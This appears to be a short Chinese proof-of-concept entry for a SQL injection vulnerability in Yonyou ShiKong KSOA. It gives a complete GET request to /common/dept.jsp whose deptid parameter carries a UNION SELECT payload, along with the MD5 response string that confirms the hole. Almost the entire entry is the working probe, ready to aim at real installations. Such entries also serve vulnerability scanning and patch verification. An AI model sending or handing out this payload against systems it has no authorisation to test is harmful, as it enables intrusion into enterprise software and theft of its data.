# 用友时空KSOA存在sql注入漏洞

用友 ｜ SQL注入 ｜ —
- **请求**：`GET /common/dept.jsp?deptid=1' UNION ALL SELECT 60%2Csys.fn_sqlvarbasetostr(HASHBYTES('MD5'%2C'12345'))-- HTTP/1.1`
- **响应特征**：200 0x827ccb0eea8a706c4c34a16891f84e7b